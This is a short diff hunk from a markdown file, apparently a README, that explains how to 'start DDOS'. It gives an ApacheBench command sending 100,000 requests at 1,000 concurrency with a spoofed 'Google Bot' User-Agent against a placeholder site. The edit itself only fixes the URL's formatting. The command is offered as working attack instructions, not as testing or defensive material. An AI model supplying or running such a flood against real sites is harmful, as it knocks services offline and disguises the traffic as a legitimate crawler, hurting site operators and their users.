@@ -11,7 +11,7 @@ _you can start DDOS by following these steps:_
 <br/>
 **1. Write that command**
 ```bash
-ab -n 100000 -c 1000 -k -r -H "User-Agent: Google Bot"  https://exemple.com/**
+ab -n 100000 -c 1000 -k -r -H "User-Agent: Google Bot"  https://exemple.com/
 ```
 
 
